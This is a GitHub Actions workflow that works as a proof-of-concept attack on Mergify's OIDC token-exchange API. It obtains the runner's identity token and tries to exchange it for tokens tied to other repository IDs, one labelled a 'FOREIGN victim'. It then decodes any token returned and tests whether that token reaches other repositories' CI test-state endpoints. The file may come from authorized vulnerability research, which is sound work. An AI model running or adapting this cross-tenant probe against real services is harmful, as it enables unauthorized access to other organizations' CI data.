name: oidc-e2e
on:
  push:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  exchange:
    runs-on: ubuntu-latest
    steps:
      - name: exchange probes
        run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fapi.mergify.com" | jq -r .value)
          probe () {
            echo "=== $1"
            jq -n --argjson id "$2" --arg t "$TOKEN" '{repository_id:$id,id_token:$t}' > /tmp/body
            curl -s -o /tmp/r -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H 'Content-Type: application/json' --data @/tmp/body
            head -c 400 /tmp/r; echo
            T=$(jq -r '.token // empty' /tmp/r 2>/dev/null)
            if [ -n "$T" ]; then
              echo "token_payload=$(echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null)"
              echo -n "reach own-repo CI: "; curl -s -o /dev/null -w '%{http_code}\n' "https://api.mergify.com/v1/ci/ertugrulphp/repositories/ertugrulphp/test-states" -H "Authorization: Bearer $T"
              echo -n "reach commerce CI: "; curl -s -o /dev/null -w '%{http_code}\n' "https://api.mergify.com/v1/ci/ertugrulphp/repositories/commerce/test-states" -H "Authorization: Bearer $T"
            fi
          }
          probe "P1 own repo 535704198 NOT in policy" 535704198
          probe "P2 commerce 557596580 IN policy" 557596580
          probe "P3 FOREIGN victim 1458145787" 1458145787
